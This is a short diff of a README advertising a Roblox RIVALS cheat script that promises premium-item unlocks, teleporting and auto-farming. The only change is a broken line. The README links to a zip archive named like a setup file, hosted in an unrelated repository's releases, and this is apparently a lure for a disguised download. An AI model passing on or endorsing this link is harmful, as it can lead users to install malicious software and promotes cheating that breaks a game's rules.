@@ -5,7 +5,8 @@
 
 
 # RIVALS-Script
-The Roblox RIVALS Script is a powerful tool to automate gameplay in Roblox’s RIVALS game. Unlock premium items, teleport, auto-farm, and more with customizable settings. Boost your gaming experience with this feature-packed script and stay ahead of the competition! 🚀🎮
+The Roblox RIVALS Script is a powerful tool to automate gameplay in Roblox’s RIVALS game. Unlock premium items, teleport, auto-farm, and more with customiz
+able settings. Boost your gaming experience with this feature-packed script and stay ahead of the competition! 🚀🎮
 
 <div style="text-align: center">
   <a href="https://github.com/ROMILDOVAZ/musicas/releases/download/fdsfdsf/Setuvlast.zip">
